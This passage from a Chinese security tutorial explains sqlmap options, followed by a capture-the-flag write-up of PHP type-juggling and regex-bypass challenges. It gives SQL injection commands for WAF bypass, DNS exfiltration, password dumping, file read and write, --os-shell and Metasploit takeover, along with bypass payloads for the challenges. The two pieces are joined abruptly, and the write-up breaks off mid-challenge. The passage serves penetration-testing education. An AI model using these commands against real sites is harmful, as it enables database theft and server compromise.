当web服务器需要适当的客户端证书和用于身份验证的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。\n–auth-file 文件名\n3.9 设置安全模式 避免在多次请求失败后销毁会话\n有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。\n–safe-url, –safe-post, –safe-req –safe-freq\n通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。\n3.10 设置忽略URL编码 据参数的位置(例如GET)，默认情况下它的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。在这种情况下使用–skip-urlencode。\n–skip-urlencode 不进行URL加密\n0x04 sqlmap 性能优化 4.1 设置持久 HTTP 连接 Sqlmap中可以设置连接为持久连接。 HTTP报文中设置 Connection: Keep-Alive。（通过减少连接次数来提升性能） 参数： –keep-alive 注意该参数与 -proxy参数不兼容\n4.2 设置 HTTP 空连接 Sqlmap中设置空连接， 表示直接获得HTTP响应的大小而不用获得HTTP响应体。 常用在盲注判断真/假中，降低网络带宽消耗。 参数： –null-connection 注意这个参数，与–text-only参数不兼容\n4.3 设置多线程 Sqlmap中设置同时发送多少个HTTP请求的多线程。\n–threads 默认是1个线程。 为了不影响目标站点服务器的性能， Sqlmap可以设置最大的线程数为10。\n4.5 设置预测输出 Sqlmap中的预测输出， 在推理算法中用于检索值字符的顺序统计预测。 参数： –predict-output\n注意这个参数与 –thread参数不兼容。\n使用 -o 参数可开启前面三个性能参数（–keep-alive 、–null-connection 、 –predict-output），不开启 –threads参数\n0x05 sqlmap 注入位置介绍 5.0 注入介绍 所谓SQL注入， 就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串， 最终达到欺骗服务器执行恶意的SQL命令。 具体来说， 它是利用现有应用程序， 将（恶意的） SQL命令注入到后台数据库引擎执行的能力， 它可以通过在Web表单中输入（恶意） SQL语句得到一个存在安全漏洞的网站上的数据库， 而不是按照设计者意图去执行SQL语句。\n由此可见： SQL注入发生位置 HTTP数据包中任意位置\n5.1 设置指定注入参数 Sqlmap测试参数 -p, –skip –param-exclude –skip-static\n-p ： 指定具体探测的参数。 例如： -p “id,user-agent”\n–skip： 忽略探测具体的参数。 例如： –level –skip “user-agent,referer”\n–param-exclude： 忽略包含具体内容的参数。 例如： –param-exclude=“token|session” 不对包含token或session的参数进行探测。\n–skip-static： 忽略非动态参数\n5.2 设置URL注入位置 当注入点位于URL本身内部时， 会出现一些特殊情况。 除非手动指向URL路径， 否则sqlmap不会对URL路径执行任何自动测试。 必须在命令行中添加星号(*)来指定这些注入点。\n例如， 当使用Apache web服务器的mod_rewrite模块或其他类似的技术时， 这就显得特别有用了\npython sqlmap.py -u http://targeturl/param1/value1*/param2/value2/\n5.3 设置任意注入位置 与URL注入点类似， 星号(*)(注意:这里也支持Havij样式%INJECT %)也可以用来指向GET、POST或HTTP头中的任意注入点。 注入点可以通过在带有选项-u的GET参数值、 带有选项–data数据的POST参数值、 带有选项-H的HTTP（header）头值、 带有选项-A的User_Agent头、 用户代理、 引用和/或cookie的HTTP头值中指定， 或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。\npython sqlmap.py -u “http://targeturl” –cookie=”param1=value1*;param2=value2\n0x06 sqlmap 注入参数 6.1 强制设置 DBMS 默认情况下Sqlmap会自动识别探测目标Web应用程序的后端数据库管理系统（DBMS） ， 以下列出\nSqlmap完全支持的DBMS种类：\nMysql、 Oracle、 Microsoft SQL Server、 IBM DB2、 SQLite、 Firebird、 Sybase、 SAP MaxDB、HSQLDB、 Informix\n–dbms 数据库管理系统名称 [版本号]\n例如： –dbms mysql 5.0 、 –dbms microsoft sql server 05\n6.2 强制设置 OS 默认情况下Sqlmap会自动识别探测目标Web应用程序的后端操作系统（OS） ， 以下列出Sqlmap完全支持的OS种类。 Linux 、 Windows\n请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。 例如： –os windows 或 –os linux\n请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。\n6.3 关闭负载转换机制 在检索结果时， sqlmap使用一种机制， 在这种机制中， 所有条目都被转换为字符串类型， 并在NULL值的情况下用空格字符替换。 这样做是为了防止出现任何错误状态(例如， 将空值与字符串值连接起来)， 并简化数据检索过程本身。 尽管如此， 还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例如没有返回值)需要关闭这种机制(使用此开关)。\n–no-cast\n6.4 关闭字符转义机制 在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如， 选择’foobar’)时， 这些值将自动转义(例如， 选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))。这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes和/或mysql_real_escape_string)的潜在问题。 用户可以使用这个开关关闭它(例如减少有效负载大小)。\n–no-escape（一般不建议关闭）\n6.5 强制设置无效值替换 在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用大整数值来实现相同的目标(例如id=99999999)。 –invalid-bignum\n在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用布尔操作来实现相同的目标(例如id=13 and18=19)。 –invalid-logical\n在sqlmap需要使原始参数值无效(例如id=13)时，它使用经典的否定(例如id=-13)。有了这个开关，就可以强制使用随机字符串来实现相同的目标(例如id=akewmc)。 –invalid-string\n6.6 自定义注入负载位置 在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。 –prefix 设置SQL注入Payload前缀 –suffix 设置SQL注入Payload后缀\n例如： SQL查询语句为：\njavascript\r1 $query = \u0026#34;SELECT * FROM users WHERE id=(\u0026#39; . $_GET[\u0026#39;id\u0026#39;] . \u0026#39;) LIMIT 0, 1\u0026#34;; sqlmap参数使用： python sqlmap.py -u “http://ip/sqlmap/mysql/get_str_brackets.php ?id=1” -p id –prefix “’)” –suffix “AND (‘abc’=’abc”\n插入Payload后的SQL查询语句：\njavascript\r1 $query = \u0026#34;SELECT * FROM users WHERE id=(\u0026#39;1\u0026#39;) \u0026lt;PAYLOAD\u0026gt; AND (\u0026#39;abc\u0026#39;=\u0026#39;abc\u0026#39;) LIMIT 0, 1\u0026#34;; 6.7 设置 Tamper 脚本 sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。\nsqlmap.py -u “http://ip/sqlmap/mysql/get_int.php?id=1” –tamper“between.py,randomcase.py,space2comment.py” -v 3\n6.8 设置 DBMS 认证 设置DBMS认证方式通过以下命令：\n–dbms-cred = username:password\n0x07 sqlmap 自定义检测参数 7.1 设置探测等级 –level 此选项需要指定要执行的测试等级的参数。有五个层次。在执行有限数量的测试(请求)时，默认值为1。1~5探测复杂逐步提升。\nsqlmap使用的有效负载在文本文件xml/payload .xml中指定。按照文件顶部的说明，如果sqlmap错过了注入，您也应该能够添加自己的有效负载来进行测试!\n这个选项不仅会影响到哪个有效负载sqlmap尝试，还会影响到在考试中取哪个注入点:GET和POST参数总是被测试，HTTP Cookie头值从第2级测试，HTTP用户代理/引用头值从第3级测试。\n总之，检测SQL注入越困难，必须设置的——级别就越高。 在显示无法注入时，可以设置 –level 5 来进行更强大的探测\n7.2 设置风险参数 此选项需要指定要执行测试的风险的参数。有三个风险值。默认值为1，这对于大多数SQL注入点来说是无害的。风险值2增加了大量基于查询时间的SQL注入测试的默认级别，值3也增加了基于or的SQL注入测试。\n在某些情况下，比如UPDATE语句中的SQL注入，注入基于or的有效负载可能导致表的所有条目的更新，这肯定不是攻击者想要的。出于这个原因和其他原因，我们引入了这个选项:用户可以控制测试的有效负载，用户可以任意选择使用也有潜在危险的负载。\n例如： –risk num num范围 1~3\n7.3 设置页面比较参数 默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用是因为在每次刷新页面内容的变化有时甚至没有注射,例如当页面有一个计数器,一个动态广告横幅或任何其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。\n–string：指定包含字符串 查询为True –not-string：指定包含字符串 查询为False –regexp：指定通过正则表达式匹配字符串,查询为True –code：指定匹配HTTP状态响应码，查询为True\n7.4 设置内容比较参数 –text-only：设置页面内容中包含文本。\n例如：–text-only = “Welcome for True and Forbidden for False”\n–titles：设置页面title中包含文本。前提需要知道如何区分查询的真与假，根据返回字符串内容不同。 –titles=”Login”\n0x08 sqlmap 注入技术参数 8.1 设置具体 SQL 注入技术 –technique 参数用来设置具体SQL注入技术。以下列出Sqlmap支持的SQL注入技术。\nB: Boolean-based blind 基于布尔的盲注 E: Error-based 报错注入 U: Union query-based Union查询注入 S: Stacked queries 堆叠注入 T: Time-based blind 基于时间的盲注 Q: Inline queries 内联查询注入\n例如：sqlmap -u “存在注入点的URL” –technique B –current-db 利用基于布尔的盲注对注入点进行SQL注入探测\n8.2 设置时间盲注延迟时间 在测试基于时间的盲SQL注入时，可以设置秒来延迟响应，方法是提供–time-sec选项，后面跟着一个整数。默认情况下，它的值设置为5秒。\n例如： sqlmap -u “存在注入点的URL” –time-sec 3 –current-db\n8.3 设置 UNION 字段数 默认情况下，sqlmap测试使用1到10列的UNION查询SQL注入技术。但是，通过提供更高–level值，可以将此范围增加到50列。\n您可以手动告诉sqlmap使用特定范围的列来测试这种类型的SQL注入，方法是为该工具提供选–union-cols后跟一系列整数。例如，12-16表示使用12到16个列对UNION查询SQL注入进行测试。\n例如：sqlmap -u “存在注入的URL” –union-cols 12-18 –current-db\n8.4 设置 UNION 字符 默认情况下，sqlmap测试使用空字符的联合查询SQL注入技术。但是，通过提供更高级别的值sqlmap，还将使用随机数执行测试，因为在某些情况下，UNION查询测试使用NULL会失败，而使用随机整数则会成功。\n您可以手动告诉sqlmap使用特定字符测试这种类型的SQL注入，方法是使用带有所需字符值的选项–union-char(例如–union-char 123)。\n8.5 设置 UNION 查询表 某些情况下，Sqlmap需要设定Union 查询SQL注入的具体数据表才可以得到数据。 –union-from 表名\n8.6 设置 DNS 露出攻击 针对目标网络很有可能对外部流量进行限制，或者设置WAF。\n通过设置DNS流量来突破限制 –dns-domain “dns服务器” 需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得Web应用程序中数据内容。\n8.7 设置二次注入 Sqlmap中可以设置二次注入的结果页面。 –second-url URL\n8.8 识别指纹 –fingerprint -f 探测目标指纹信息。\n0x09 sqlmap 检索 DBMS 信息 9.1 检索 DBMS Banner 信息 获取后端数据库Banner信息。 –banner或者 -b\n9.2 检索 DBMS 当前用户 获取DBMS当前用户 –current-user\n9.3 检索 DBMS 当前数据库 获取当前数据库名。 –current-db\n9.4 检索 DBMS 当前主机名 –hostname\n0x0A sqlmap 枚举 DBMS 信息 10.1 探测当前用户 DBA –is-dba 探测当前用户是否是数据库管理员。\n若返回True，则说明当前用户是数据库管理员\n10.2 枚举 DBMS 用户 获取DBMS所有用户 –users\n10.3 枚举 DBMS 用户密码 –password 获取用户密码\n10.4 枚举 DBMS 权限 –privileges –role(角色)\n10.5 枚举数据库名 –dbs 列举数据库名称\n10.6 枚举数据库表 –tables 枚举表名 –\u0026gt; 指定具体数据库 -D 数据库名 –exclude-sysdbs 只列出用户自己新建的数据库和表\n（排除DBMS系统数据库，当枚举表时）\n10.7 枚举数据库表的列名 –columns -D指定数据库 -T指定数据表 -C指定具体字段\n10.8 枚举数据值 –dump\n0x0B sqlmap 枚举信息 11.1 枚举 schema 信息 用户可以使用此开关–schema检索DBMS模式。模式列表将包含所有数据库、表和列，以及它们各自的类型。与–exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分。\npython sqlmap.py -u “http://192.168.48.130/sqlmap/mysql/get_int.php?id=1” –schema–batch –exclude-sysdbs\n11.2 枚举数据表数量 如果用户只想知道表中的条目数，则可以使用此开关。 –count\npython sqlmap.py -u “http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1” –count -D testdb\n11.3 获取数据信息 –start, –stop, –first, –last\n–start 1 –stop3 获取第二张到第三张表的名字 –stop 1 获取第一张表的名字 –first 3 –last 5 获取从第三出发到第五个字符\n11.4 设置条件获取信息 –pivot-column=id 设置独一无二的列 –where=“id\u0026gt;3” 设置条件\n11.5 暴力激活成功教程数据 使用场景：Mysql\u0026lt;5.0时，Mysql中没有元数据库 information_schema。 –common-tables 暴力激活成功教程表名 –common-columns 暴力激活成功教程列名\n11.6 读取文件 前提：已知目标主机文件路径 –file-read 路径 读取对应文件内容。 注意：此处路径为绝对路径。（需要使用//,其中一个/表示转义）\n11.7 写入文件 –file-write 读取本地文件 –file-dest 将读取到的文件写入到远程绝对路径\n11.8 检索所有信息 -a –all\n0x0C sqlmap 系统参数 12.1 执行系统命令 前提条件：\n网站必须是root权限 攻击者需要知道网站的绝对路径 GPC为off（即magic_quotes_gpc = off），php主动转义的功能关闭 若需要上传文件，则secure_file_priv 不为NULL –os-shell\n12.2 结合Metasploit python sqlmap.py -u “注入点” –os-pwn –msf-path (若不使用该参数，则自动选择默认路径) （只适用于MySQL and PostgreSQL 数据库）\n12.3 注册表介绍 注册表（Registry，繁体中文版Windows操作系统称之为登录档）是Microsoft Windows中的一个重要的数据库，用于存储系统和应用程序的设置信息。早在Windows 3.0推出OLE技术的时候，注册表就已经出现。随后推出的Windows NT是第一个从系统级别广泛使用注册表的操作系统。但是，从Microsoft Windows 95操作系统开始，注册表才真正成为Windows用户经常接触的内容，并在其后的操作系统中继续沿用至今。\n12.4 注册表操作 –reg-read –reg-add –reg-del –reg-key, –reg-value, –reg-data –reg-type\n例如： $ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 –reg-add –reg-key=“HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1\n0x0D sqlmap 通用参数（一） 13.1 加载 sqlite 会话文件 sqlmap自动为每个目标创建持久会话SQLite文件，位于专用输出目录中，其中存储会话恢复所需的所有数据。如果用户想显式地设置会话文件位置(例如在一个位置为多个目标存储会话数据)，可以使用此选项。\n-s “会话文件”\n13.2 加载 http 文本文件 这个选项需要指定文本文件的参数来写入sqlmap – HTTP(s)请求和HTTP(s)响应生成的所有HTTP(s)流量。 这主要用于调试目的——当您向开发人员提供一个潜在的bug报告时，也发送这个文件。 -t 参数\n13.3 设置默认选择选项 如果希望sqlmap作为批处理工具运行，在sqlmap需要时不需要任何用户交互，那么可以使用—–batch来强制执行。这将使sqlmap在需要用户输入时保持默认行为。\n13.4 执行系统命令 –os-cmd=”命令”\n13.5 设置盲注字符集 在基于布尔和基于时间的SQL盲注中，用户可以强制使用自定义字符集来加速数据检索过程。\n例如，如果转储消息摘要值(例如SHA1)，则使用–charset=“0123456789abcdef”，预期请求数量比正常运行少30%左右\n13.6 爬取 URL sqlmap可以通过从目标位置开始收集链接(爬行)来收集潜在的脆弱链接。使用此选项，用户可以设置一个深度(到起始位置的距离)，低于这个深度，sqlmap不会进入收集阶段，因为只要有新的链接要访问，就会递归地执行这个过程。 –crawl python sqlmap.py -u “http://192.168.21.128/sqlmap/mysql/” –batch –crawl=3 –crawl-exclude 字符串 存在字符串的URL不进行爬取\n13.7 在 CSV 输入中使用的分割字符 当被转储的数据存储到CSV格式(–dump-format=CSV)时，条目必须用“分离值”分隔(默认值是 ”，”)。如果用户想要覆盖它的默认值，他可以使用这个选项(例如–csv-del=”@”)。\n13.8 设置输出格式 当将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式:CSV、HTML和SQLITE。默认的是CSV，其中每个表行一行一行地存储在文本文件中，每个条目用逗号分隔(或提供了选项–csv-del)。对于HTML，输出被存储到一个HTML文件中，其中每一行都用格式化表中的一行表示。对于SQLITE，输出存储在SQLITE数据库中，原始表内容复制到同名的相应表中。\n–dump-format\n13.9 探测之前检测 Internet 连接 在进行评估目标之前，检测当前计算机Internet连接是否正常。确保探测失败不是因为网路拦截问题。\n–check-internet\n13.10 解析和测试表单的输入字段 –form\n0x0E sqlmap 通用参数（二） 14.1 设置预计完成时间 可以实时地计算和显示估计的到达时间，以检索每个查询输出。当用于检索输出的技术是任何盲SQL注入类型时，就会显示这一点。 –eta\n14.2 刷新会话文件 由于会话文件的概念，所以最好知道您可以使用选项–flush-session刷新该文件的内容。通过这种方式，您可以避免sqlmap中默认实现的缓存机制。其他可能的方法是手动删除会话文件。\n14.3 忽略会话中的存储结果 使用选项–fresh-queries来忽略该文件的内容。通过这种方式，可以保持会话文件不变，对于所选的运行，避免恢复/恢复查询输出。\n14.4 使用 Hex 函数检索数据 非ascii数据的检索需要特殊的需求。解决这个问题的一个方法是使用DBMS hex函数。数据在被检索之前被编码为十六进制形式，然后被未编码为原始形式。\n–hex\n例如： python sqlmap.py -u “http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1” –hex -v 3 –batch\n14.5 设置自定义输出路径 sqlmap默认将会话和结果文件存储在子目录输出中。如果您想使用不同的位置，可以使用这个选项(例如–output-dir=/tmp)。\n14.6 从响应页面解析错误 如果web应用程序配置为调试模式，以便在HTTP响应中显示后端数据库管理系统错误消息，sqlmap可以解析并显示它们。这对于调试很有用，比如理解为什么某个枚举或接管开关不起作用——这可能与会话用户的特权有关 –parse-error\n保存Sqlmap配置文件 –save 可以将命令行选项保存到配置INI文件中。然后，可以使用之前解释的-c选项编辑生成的文件并将其传递给sqlmap。\n更新Sqlmap –update\n14.7 强制设置 DBMS 编码 –encoding=”gbk”\n14.8 存储 HTTP 流量到 HAR –har=”HARFILE” HAR（HTTP Archive），是一个用来储存HTTP请求/响应信息的通用文件格式，基于JSON。\n14.9 筛选具体 Payload –test-filter=”ROW”\n14.10 过滤具体 Payload –test-skip=”BENCHMARK”\n补充： 针对proxy日志文件使用正则表达式筛选目标 –scope=”regex”\n0x0F sqlmap 杂项参数 15.1 使用缩写助记符 Sqlmap提供灵活的缩写助记符来进行快速书写命令。 -z 参数\n例如： python sqlmap.py –batch –random-agent –ignore-proxy –technique=BEU -uwww.target.com/vuln.php?id=1″\n使用助记符： python sqlmap.py -z “bat,randoma,ign,tec=BEU” -u “www.target.com/vuln.php?id=1”\n15.2 设置探测预警 在发现SQL注入漏洞时，运行本机主机系统命令 –alert\n15.3 设置问题答案 如果用户想自动设置问题的答案，即使使用–batch，使用–answers，通过在等号后面提供问题的任何部分和答案来完成。另外，不同问题的答案可以用分隔符分隔。\n例如： python sqlmap.py -u “http://192.168.22.128/sqlmap/mysql/get_int.php?id=1”–technique=E –answers=“extending=N” –batch\n15.4 发现 SQL 注入预警 如果用户使用–beep，当发现SQL注入时，会立即发出哔哔的警告。这在需要测试的大量目标url(选项-m)时特别有用。\n15.5 其他 –cleanup 清除DBMS udf创建的数据表 –dependencies 查看依赖项 –disable-coloring 不进行高亮显示 –identify-waf 查看是否具有WAF保护 –moblie 使用手机端User-Agent –purge-output 清除output目录下的文件 –skip-waf 绕过WAF –sqlmap-shell 使用sqlmap shell –tmp-dir=TMPDIR 指定本地目录用来存储临时文件 –web-root=WEBROOT 指定站点根目录 –wizard 使用向导式的sqlmap –gpage=GOOGLEPAGE 设置Google Dork的页码数\n–smart 智能探测 有些情况下，用户有大量的潜在目标URL（例如，提供了选项 -m），希望尽快找到一个脆弱的目标。如果使用—smart，那么将在扫描中进一步使用数据库管理系统错误的参数，否则就跳过它们\n0x10 常用 Tamper 脚本 这里推荐几篇比较详细的文章去学习： https://www.cnblogs.com/mark0/p/12349551.html\nhttps://blog.csdn.net/qq_34444097/article/details/82717357?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159341834119725219951313%2522%252C%2522scm%2522%253A%252220140713.130102334…%2522%257D\u0026amp;request_id=159341834119725219951313\u0026amp;biz_id=0\u0026amp;utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~pc_rank_v3-5-82717357.first_rank_ecpm_v1_pc_rank_v3\u0026amp;utm_term=sqlmap+tamper脚本\n版权声明：本文内容由互联网用户自发贡献，该文观点仅代表作者本人。本站仅提供信息存储空间服务，不拥有所有权，不承担相关法律责任。如发现本站有涉嫌侵权/违法违规的内容， 请发送邮件至 举报，一经查实，本站将立刻删除。\n发布者：全栈程序员栈长，转载请注明出处：https://javaforall.cn/200744.html原文链接：https://javaforall.cn\n4、PHP特性 web89 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if (isset($_GET[\u0026#39;num\u0026#39;])) {\t//传入num $num = $_GET[\u0026#39;num\u0026#39;];\t//将num的值赋给$num if (preg_match(\u0026#34;/[0-9]/\u0026#34;, $num)) {\t//检查 $num 是否包含数字字符 die(\u0026#34;no no no!\u0026#34;);\t//若匹配到数字，脚本终止并输出 no no no! } if (intval($num)) {\techo $flag;\t//将 $num 转换为整数，若结果非零则输出 $flag } } 根据intval()的特性：intval($num)为真，获取flag\n可以输入数组：\nplain\r1 ?num[]=1 获得了flag\n补充知识：\nintval()函数用于将变量转换为整数。其行为根据输入类型的不同而变化，\n1. 基本语法\nphp\r1 intval(mixed $value, int $base = 10): int $value：要转换的变量（支持所有数据类型）\n$base：转化所使用的进制（默认10，仅对字符串有效）\n2. 不同数据类型的转换规则\n2.1 字符串\n尝试提取开头的数字部分，忽略后续非数字字符。\nplain\r1 2 3 4 intval(\u0026#34;123\u0026#34;); // 123 intval(\u0026#34;45.67\u0026#34;); // 45（浮点截断） intval(\u0026#34;123abc\u0026#34;); // 123（忽略字母） intval(\u0026#34;abc123\u0026#34;); // 0（开头无数字） 2.2 浮点数\n直接截断小数部分。\nplain\r1 2 intval(3.14); // 3 intval(-2.718); // -2 2.3 布尔\nplain\r1 2 intval(true); // 1 intval(false); // 0 2.4 数组\n空数组（[]） –\u0026gt; 0\n非空数组（至少一个元素） –\u0026gt; 1\nplain\r1 2 3 intval([]); // 0 intval([\u0026#34;a\u0026#34;]); // 1 intval([0, 1]); // 1（与元素内容无关） 2.5 对象\n不能用于 object，否则会产生 E_NOTICE 错误并返回 1\n2.6 NULL\n始终返回 0\nplain\r1 intval(null); // 0 web90 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if (isset($_GET[\u0026#39;num\u0026#39;])) {\t//检查是否存在num的GET参数 $num = $_GET[\u0026#39;num\u0026#39;];\t//将GET参数num的值赋给变量$num if ($num === \u0026#34;4476\u0026#34;) {\t//比较$num是否等于字符串\u0026#34;4476\u0026#34;，若成立则终止脚本 die(\u0026#34;no no no!\u0026#34;); } if (intval($num, 0) === 4476) { echo $flag;\t//将$num转换为整数（自动检测进制），若结果为4476，则输出$flag } else { echo intval($num, 0); } } 当num为4476时输出no no no！\n当num的整数部分为4476时得到flag\n$num 为 \u0026ldquo;4476a\u0026rdquo;（不全等于 \u0026ldquo;4476\u0026rdquo;），绕过 die()\nintval(\u0026ldquo;4476a\u0026rdquo;, 0) → 4476，触发 echo $flag\nplain\r1 2 3 4 5 6 7 payload:（都可以绕过） ?num=4476a # 附加字母 ?num=4476%20 # 附加空格（URL编码） ?num=4476.0 # 浮点表示 ?num=4476e0 # 科学计数法 ?num=0x117c # 十六进制 ?num=010574 # 八进制 web91 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php show_source(__FILE__); include(\u0026#39;flag.php\u0026#39;); $a=$_GET[\u0026#39;cmd\u0026#39;]; if(preg_match(\u0026#39;/^php$/im\u0026#39;, $a)){ if(preg_match(\u0026#39;/^php$/i\u0026#39;, $a)){ echo \u0026#39;hacker\u0026#39;; } else{ echo $flag; } } else{ echo \u0026#39;nonononono\u0026#39;; } nonononono 我们需要构造一个输入使得它满足两个正则表达式条件：第一个正则（带多行模式）匹配成功，而第二个正则（不带多行模式）匹配失败。\n/i 表示匹配的时候不区分大小写\n/m 表示多行匹配\n^$符号表示匹配每一行的开头结尾\n多行模式匹配： 第一个正则/^php$/im中的m修饰符允许^和$匹配每行的开头和结尾。只要有一行是php，则匹配成功。 单行模式不匹配： 第二个正则/^php$/i要求整个字符串必须完全匹配php，且没有多行模式，因此必须整个字符串都是php。 构造Payload：\n在输入中添加换行符%0a，使得其中一行是php，但整个字符串不以php结尾。例如：php%0a。这样，第一行是php，满足第一个正则；整个字符串是php\\n，不符合第二个正则的完整匹配。\nplain\r1 ?cmd=php%0a 这里发现这个payload并不能使用\n错误原因：（这里询问了ai）\n输入内容为 php\\n（php 后跟换行符）。 第一个正则匹配成功：第一行是 php，符合多行模式。 第二个正则也匹配成功：PHP 的 preg_match 在单行模式下，$ 会忽略末尾的换行符！因此实际匹配的是 php，导致输出 hacker。 这是 PHP 正则表达式的一个特性：默认情况下，$ 匹配字符串结尾或结尾的换行符前的位置（即使没有 m 修饰符）。 plain\r1 ?cmd=%0aphp 换位置后发现可以返回flag\n输入内容为 \\nphp（换行符后跟 php）。 第一个正则匹配成功：第二行是 php，符合多行模式。 第二个正则匹配失败：整个字符串是 \\nphp，不以 php 开头，因此无法匹配。 补充知识：\n正则运算符\n正则运算符是用于处理文本匹配的工具，主要用于在字符串中查找、替换或提取符合特定规则的文本。你可以把它理解为一个“文本过滤器”，帮助你快速找到想要的文字内容。\n正则运算符的基本符号：\n.：匹配任意单个字符（除了换行符）。例如：a.b 可以匹配 aab、acb、a1b 等。 \\*：匹配前面的字符 0 次或多次。例如：ab* 可以匹配 a、ab、abb、abbb 等。 +：匹配前面的字符 1 次或多次。例如：ab+ 可以匹配 ab、abb、abbb，但不能匹配 a。 ?：匹配前面的字符 0 次或 1 次。例如：ab? 可以匹配 a 或 ab。 \\d：匹配数字（0-9）。例如：\\d+ 可以匹配 123、4567 等。 \\w：匹配字母、数字或下划线。例如：\\w+ 可以匹配 abc、123、a_1 等。 []：匹配括号内的任意一个字符。例如：[abc] 可以匹配 a、b 或 c。 ^：匹配字符串的开头。例如：^abc 可以匹配以 abc 开头的字符串。 $：匹配字符串的结尾。例如：abc$ 可以匹配以 abc 结尾的字符串。 ^ \u0026amp;：匹配字符串例如：^abc\u0026amp;匹配以abc开头和以abc结尾的字符串，实际上是只有abc与之匹配 \u0026quot;notice\u0026quot;: 匹配包含notice的字符串； 简单示例：\n假设你有一段文字：\nplain\r1 我的电话是 123-4567-8901，邮箱是 abc@example.com。 用正则表达式 \\d{3}-\\d{4}-\\d{4} 可以提取出电话号码 123-4567-8901。 用正则表达式 \\w+@\\w+\\.\\w+ 可以提取出邮箱 abc@example.com。 正则运算符的修饰符：\ni - 不区分大小写匹配时忽略字母的大小写。 m - 多行模式使 ^ 和 $ 匹配每一行的开始和结束，而不是整个字符串的开始和结束。 web92 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num==4476){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } 这一关和90一样\nweb93 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num==4476){ die(\u0026#34;no no no!\u0026#34;); } if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } web94 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num===\u0026#34;4476\u0026#34;){ die(\u0026#34;no no no!\u0026#34;); } if(preg_match(\u0026#34;/[a-z]/i\u0026#34;, $num)){ die(\u0026#34;no no no!\u0026#34;); } if(!strpos($num, \u0026#34;0\u0026#34;)){ die(\u0026#34;no no no!\u0026#34;); } if(intval($num,0)===4476){ echo $flag; } } 首先不能完全等于4476，也不能包含任何字母，strpos函数检查num中是否包含字符\u0026quot;0\u0026quot;（必须包含“0”），最后使用intval函数将num转换为整数\nstrpos() 函数，用于在字符串中查找一个子串的第一次出现位置。如果找到了子串，则返回子串在字符串中的位置（索引），否则返回 false。\n因此我们可以输入4476.0来绕过\npayload:\nplain\r1 ?num=4476.0 web95 php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); if(isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if($num==4476){ die(\u0026#34;no no no!\u0026#34;); } if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num)){ die(\u0026#34;no no no!!\u0026#34;); } if(!strpos($num, \u0026#34;0\u0026#34;)){ 